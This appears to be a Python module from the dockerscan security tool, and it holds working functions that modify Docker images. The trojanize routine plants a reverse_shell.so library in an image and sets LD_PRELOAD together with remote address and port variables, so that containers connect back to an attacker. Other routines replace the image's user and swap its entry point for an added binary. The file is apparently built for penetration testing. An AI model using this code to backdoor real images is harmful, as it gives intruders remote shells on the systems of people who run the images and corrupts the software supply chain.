import json
import os.path
import logging
from contextlib import contextmanager

from dockerscan import DockerscanReturnContextManager
from .model import *
from ..docker_api import *

log = logging.getLogger("dockerscan")

REMOTE_SHELL_PATH = "/usr/share/lib/reverse_shell.so"


def run_image_modify_trojanize_dockerscan(
        config: DockerImageInfoModifyTrojanizeModel):

    assert isinstance(config, DockerImageInfoModifyTrojanizeModel)

    output_docker_image = config.output_image
    image_path = config.image_path

    if not output_docker_image:
        output_docker_image = os.path.basename(config.image_path)

    if not output_docker_image.endswith("tar"):
        output_docker_image += ".tar"

    # Choice the shell
    if not config.custom_shell:
        SHELL_PATH = os.path.join(os.path.dirname(__file__),
                                  "shells",
                                  "reverse_shell.so")
    else:
        SHELL_PATH = os.path.abspath(config.custom_shell)

    # 1 - Get layers info
    log.debug(" > Opening docker file")
    with open_docker_image(image_path) as (
            img, top_layer, _, manifest):

        # 2 - Get the last layer in manifest
        old_layer_digest = get_last_image_layer(manifest)
        log.debug(" > Last layer: {}".format(old_layer_digest))

        with extract_layer_in_tmp_dir(img, old_layer_digest) as d:

            # Start trojanizing
            log.info(" > Starting trojaning process")

            # 3 - Copy the shell
            log.info(" > Coping the shell: 'reverse_shell.so' "
                     "to '{}'".format(REMOTE_SHELL_PATH))

            copy_file_to_image_folder(d,
                                      SHELL_PATH,
                                      REMOTE_SHELL_PATH)

            new_layer_path, new_layer_digest = \
                build_image_layer_from_dir("new_layer.tar", d)

            # 5 - Updating the manifest
            new_manifest = build_manifest_with_new_layer(manifest,
                                                         old_layer_digest,
                                                         new_layer_digest)

            # Add new enviroment vars with LD_PRELOAD AND REMOTE ADDR
            json_info_last_layer = read_file_from_image(img,
                                                        "{}/json".format(
                                                            old_layer_digest))

            json_info_last_layer = json.loads(json_info_last_layer.decode())

            new_env_vars = {
                "LD_PRELOAD": REMOTE_SHELL_PATH,
                "REMOTE_ADDR": config.remote_addr,
                "REMOTE_PORT": config.remote_port
            }

            new_json_data_last_layer = update_layer_environment_vars(
                json_info_last_layer,
                new_env_vars
            )

            _, json_info_root_layer = get_root_json_from_image(img)
            new_json_info_root_layer = update_layer_environment_vars(
                json_info_root_layer,
                new_env_vars
            )

            # 6 - Create new docker image
            log.info(" > Creating new docker image")
            create_new_docker_image(new_manifest,
                                    output_docker_image,
                                    img,
                                    old_layer_digest,
                                    new_layer_path,
                                    new_layer_digest,
                                    new_json_data_last_layer,
                                    new_json_info_root_layer)


def run_image_modify_user_dockerscan(
        config: DockerImageInfoModifyUserModel):

    assert isinstance(config, DockerImageInfoModifyUserModel)

    output_docker_image = config.output_image
    image_path = config.image_path

    if not output_docker_image:
        output_docker_image = os.path.basename(config.image_path)

    if not output_docker_image.endswith("tar"):
        output_docker_image += ".tar"

    with modify_docker_image_metadata(image_path,
                                      output_docker_image) as (last_layer_json,
                                                               root_layer_json):

        new_json_data_last_layer = update_layer_user(last_layer_json,
                                                     config.new_user)
        new_json_info_root_layer = update_layer_user(root_layer_json,
                                                     config.new_user)

        raise DockerscanReturnContextManager(new_json_data_last_layer,
                                             new_json_info_root_layer)


def run_image_modify_entry_point_dockerscan(
        config: DockerImageInfoModifyEntryPointModel):

    assert isinstance(config, DockerImageInfoModifyEntryPointModel)

    output_docker_image = config.output_image
    image_path = config.image_path

    if not output_docker_image:
        output_docker_image = os.path.basename(config.image_path)

    if not output_docker_image.endswith("tar"):
        output_docker_image += ".tar"

    new_entry_point = config.new_entry_point

    add_binary_path = config.binary_path
    if add_binary_path:
        #
        # Add the new file to the image
        #
        log.info(" > Adding new data to the image")
        add_binary_path = os.path.abspath(add_binary_path)

        add_new_file_to_image(add_binary_path,
                              new_entry_point,
                              image_path)

    with modify_docker_image_metadata(image_path,
                                      output_docker_image) as (last_layer_json,
                                                               root_layer_json):

        new_json_data_last_layer = update_layer_entry_point(last_layer_json,
                                                            new_entry_point)
        new_json_info_root_layer = update_layer_entry_point(root_layer_json,
                                                            new_entry_point)

        raise DockerscanReturnContextManager(new_json_data_last_layer,
                                             new_json_info_root_layer)


__all__ = ("run_image_modify_trojanize_dockerscan",
           "run_image_modify_user_dockerscan",
           "run_image_modify_entry_point_dockerscan")
